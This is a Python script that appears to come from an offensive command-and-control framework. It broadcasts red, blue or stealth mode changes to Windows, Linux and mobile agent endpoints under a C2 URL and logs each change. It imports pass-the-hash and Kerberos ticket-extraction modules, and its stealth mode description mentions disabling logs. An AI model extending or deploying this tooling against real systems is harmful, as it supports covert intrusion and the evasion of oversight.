"""
Mode Switch - Professor&Master Memorable
Switches agent/operator between Red Team (offensive), Blue Team (defensive), and Stealth modes.
Supports multi-agent broadcast, dashboard sync, and logs all mode changes.
"""

import sys
import requests
import json
from config import C2_URL, OPERATOR_ID
from datetime import datetime
from cp_opereatorex.comms.comlink_ai import ComLinkAI
from core.opsec.anomaly_watchdog import AnomalyWatchdog
from core.ai.ai_task_suggest import suggest_tasks
from core.lateral.pass_the_hash import automate_lateral_movement
from core.lateral.kerberos_probe import extract_kerberos_tickets
from core.recon.recon_ai import passive_recon

MODES = {
    "red": "Offensive mode: full recon, lateral movement, persistence enabled.",
    "blue": "Defensive mode: monitoring, anomaly detection, OPSEC only.",
    "stealth": "Stealth mode: minimal footprint, logs disabled, beacon only."
}

AGENT_LIST = [
    # Example agent endpoints (extend with real agent URLs or IDs)
    f"{C2_URL}/agent/windows",
    f"{C2_URL}/agent/linux",
    f"{C2_URL}/agent/mobile"
]

def switch_mode(mode, broadcast=True):
    mode = mode.lower()
    if mode in MODES:
        log_event(f"Switched to {mode.upper()} - {MODES[mode]}")
        print(f"[MODE] Switched to {mode.upper()} - {MODES[mode]}")
        if broadcast:
            broadcast_mode(mode)
        sync_dashboard(mode)
        return mode
    else:
        print(f"[ERROR] Unknown mode: {mode}")
        print("Available modes:", ", ".join(MODES.keys()))
        return None

def broadcast_mode(mode):
    payload = {
        "action": "switch_mode",
        "mode": mode,
        "operator": OPERATOR_ID,
        "timestamp": datetime.now().isoformat()
    }
    for agent_url in AGENT_LIST:
        try:
            r = requests.post(agent_url, json=payload, timeout=3)
            print(f"[BROADCAST] Sent mode '{mode}' to {agent_url} (Status: {r.status_code})")
        except Exception as e:
            print(f"[BROADCAST] Failed to send to {agent_url}: {e}")

def sync_dashboard(mode):
    # Stub: Integrate with dashboard WebSocket or API for real-time UI update
    try:
        with open("dashboard_mode.log", "a") as f:
            f.write(f"[{datetime.now().isoformat()}] Dashboard synced to {mode.upper()}\n")
    except Exception:
        pass

def log_event(msg):
    try:
        with open("agent.log", "a") as f:
            f.write(f"[{datetime.now().isoformat()}] {msg}\n")
    except Exception:
        print("[LOG] Failed to write log.")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        switch_mode(sys.argv[1])
    else:
        print("Usage: python mode_switch.py <red|blue|stealth>")